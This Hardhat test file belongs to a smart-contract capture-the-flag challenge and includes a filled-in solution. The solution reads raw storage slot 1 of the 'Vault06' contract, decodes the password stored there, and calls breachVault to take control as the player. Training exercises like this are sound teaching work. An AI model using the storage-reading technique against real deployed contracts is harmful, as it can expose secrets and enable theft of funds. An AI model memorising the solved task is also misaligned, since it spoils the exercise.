// Importing Chai to use its asserting functions.
const { expect } = require("chai");

/**
 * Test Suite for the Vault06 contract.
 */
describe("Vault06 Test Suite", function () {
    let vault;
    let deployer, player;

    before(async function () {
        /** SET UP - DO NOT CHANGE ANYTHING HERE */

        // Get test accounts
        [deployer, player] = await ethers.getSigners();

        // Deploy Vault contract
        // @note: For this challenge, suppose you do not have access to the contract deployment,
        // this means that the next line will be hidden from you.
        vault = await ethers.deployContract("Vault06", ["supersecretpassword"], deployer);
        await vault.waitForDeployment();
    });

    /**
     * Here's where you try to breach the vault.
     * Fill in your logic to figure out the password and call the breachVault function.
     */
    it("Player's attempt: Breach the Vault05", async function () {

        // =========================
        // YOUR CODE GOES HERE
        // Use player account to call unlock with the correct value
        // Read the storage slot value (32 bytes)
        let slotValue = await ethers.provider.getStorage(vault.target, 1);
        // Replace the last byte with 0x00 so that it becomes a valid bytes32 string:
        slotValue = slotValue.substring(0, slotValue.length - 2) + "00";
        const password = ethers.decodeBytes32String(slotValue);
        console.log("Storage value at slot", 1, ":", password);
        await vault.connect(player).breachVault(password);
        // =========================

        /** SUCCESS CONDITIONS - DO NOT CHANGE ANYTHING HERE */
        // Check if the attack was successful
        // Expect the last solver to be the player
        expect(await vault.lastSolver(), "Last solver is not the player").to.equal(player.address);
    });
});
